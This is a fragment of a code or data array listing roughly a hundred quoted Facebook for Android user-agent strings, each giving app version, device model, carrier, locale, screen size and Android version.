"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281745;FBDM/{density=2.0,width=720,height=1384};FBLC/en_US;FBRV/229815345;FBCR/MTNSA-Take Care Mzansi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128822;FBDM/{density=3.5,width=1440,height=2712};FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 2 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=2.625,width=1080,height=2198};FBLC/en_US;FBRV/229815345;FBCR/Koodo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A705W;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128822;FBDM/{density=3.5,width=1440,height=2872};FBLC/en_US;FBRV/229499818;FBCR/Google Fi;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 4 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=2.875,width=1080,height=1782};FBLC/en_US;FBRV/229473039;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237478;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/220696934;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=2.75,width=1080,height=2236};FBLC/en_US;FBRV/230011108;FBCR/AT&amp-T;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128822;FBDM/{density=3.375,width=1080,height=2028};FBLC/en_US;FBRV/228485144;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281773;FBDM/{density=2.625,width=1080,height=2201};FBLC/en_US;FBRV/230270886;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G986U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.5,width=1440,height=2928};FBLC/en_US;FBRV/230344796;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281745;FBDM/{density=2.0,width=720,height=1193};FBLC/en_US;FBRV/230440354;FBCR/Smart!;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X210;FBSV/7.1.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/230388813;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281784;FBDM/{density=4.5,width=1440,height=2810};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-G710;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/230597884;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/228732121;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=3.0,width=1080,height=2178};FBLC/en_US;FBRV/229499818;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281713;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/230624390;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372498;FBDM/{density=2.0,width=720,height=1196};FBLC/en_US;FBRV/0;FBCR/Boost Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X410PM;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629348;FBDM/{density=4.0,width=1440,height=2368};FBLC/en_US;FBRV/210254568;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1585;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=2.625,width=1080,height=2075};FBLC/en_US;FBRV/230624390;FBCR/Bite;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A6003;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/230412125;FBCR/Metro by T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q720;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=3.5,width=1440,height=2759};FBLC/en_US;FBRV/228899333;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/230826563;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/230923160;FBCR/Vodafone AU;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281784;FBDM/{density=3.375,width=1080,height=2006};FBLC/en_US;FBRV/230826563;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372641;FBDM/{density=2.625,width=1080,height=2147};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-V405;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/230956247;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281784;FBDM/{density=3.5,width=1440,height=2872};FBLC/en_US;FBRV/231228428;FBCR/T-Mobile;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 4 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/230970086;FBCR/mobily;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281784;FBDM/{density=4.0,width=1440,height=2672};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS988;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.375,width=1080,height=2045};FBLC/en_US;FBRV/231325206;FBCR/Visible;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/Z6530V;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281779;FBDM/{density=1.75,width=720,height=1423};FBLC/en_US;FBRV/231348655;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_US;FBRV/231246646;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_US;FBRV/231384273;FBCR/HOME;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=3.0,width=1080,height=2126};FBLC/en_US;FBRV/219557400;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-G820;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/231613863;FBCR/Xfinity Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/231551424;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z3;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021072;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/231847903;FBCR/CC Network;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.375,width=1080,height=2002};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020946;FBDM/{density=1.5,width=480,height=782};FBLC/en_GB;FBRV/0;FBCR/VodaCom-SA;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 510;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020800;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930T;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021012;FBDM/{density=2.0,width=720,height=1402};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A102U;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629364;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBRV/210796532;FBCR/Home;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930VL;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021072;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_US;FBRV/232372466;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/es_LA;FBRV/0;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=1.75,width=720,height=1423};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021012;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/232621700;FBCR/ZZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=2.8125,width=1080,height=2187};FBLC/en_US;FBRV/232981844;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2120};FBLC/en_US;FBRV/232922869;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021049;FBDM/{density=3.375,width=1080,height=2032};FBLC/it_IT;FBRV/232416429;FBCR/1 MOBILE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/FIG-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/233040754;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=3.375,width=1080,height=2128};FBLC/en_US;FBRV/214496621;FBCR/ Cell C;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SNE-LX2;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/233265092;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020957;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.0,width=1080,height=2139};FBLC/en_GB;FBRV/0;FBCR/3;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/233720555;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7S;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.0,width=1080,height=2139};FBLC/en_GB;FBRV/234498748;FBCR/giffgaff;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.375,width=1080,height=2160};FBLC/en_US;FBRV/234440931;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845518;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/218418231;FBCR/T-Mobile;FBMF/BullittGroupLimited;FBBD/Cat;FBPN/com.facebook.katana;FBDV/S41;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.0,width=1080,height=2183};FBLC/en_US;FBRV/234498748;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G986U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/234040255;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235251;FBDM/{density=2.625,width=1080,height=2034};FBLC/en_US;FBRV/234691158;FBCR/Boost Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-Q710AL;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020957;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/233720555;FBCR/ZZ;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5X;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020883;FBDM/{density=3.0,width=1080,height=1792};FBLC/en_US;FBRV/233720555;FBCR/Telekom.de;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VTR-L09;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235270;FBDM/{density=1.75,width=720,height=1439};FBLC/en_US;FBRV/234709079;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/234280994;FBCR/Verizon Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235251;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/235001098;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930R4;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/270.1.0.66.127;FBBV/214895222;FBDM/{density=3.375,width=1080,height=2160};FBLC/en_US;FBRV/215683036;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681575;FBDM/{density=1.75,width=720,height=1423};FBLC/en_US;FBRV/0;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741974;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/235524047;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741952;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G891A;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/{density=3.0,width=1080,height=2068};FBLC/en_US;FBRV/235412020;FBCR/GLOBE;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1819;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741974;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/235848718;FBCR/ROGERS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960W;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741966;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_GB;FBRV/0;FBCR/Vodafone- Be Safe | Vodafone IN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J730GM;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2141};FBLC/en_US;FBRV/0;FBCR/Vodafone IN;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1907;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741951;FBDM/{density=2.0,width=720,height=1424};FBLC/en_US;FBRV/236603060;FBCR/TM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1853;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231020952;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBRV/233720555;FBCR/Verizon Wireless;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTCD160LVWPP;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741974;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/236663147;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372498;FBDM/{density=2.25,width=720,height=1280};FBLC/es_LA;FBRV/0;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J727T1;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=2094,height=1080};FBLC/de_DE;FBRV/0;FBCR/winSIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281659;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBRV/207024646;FBCR/;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/9006W;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/0;FBCR/YES OPTUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468726;FBDM/{density=2.0,width=720,height=1407};FBLC/en_US;FBRV/0;FBCR/Far EasTone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1902;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/0;FBCR/Beeline UZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281747;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/230826563;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
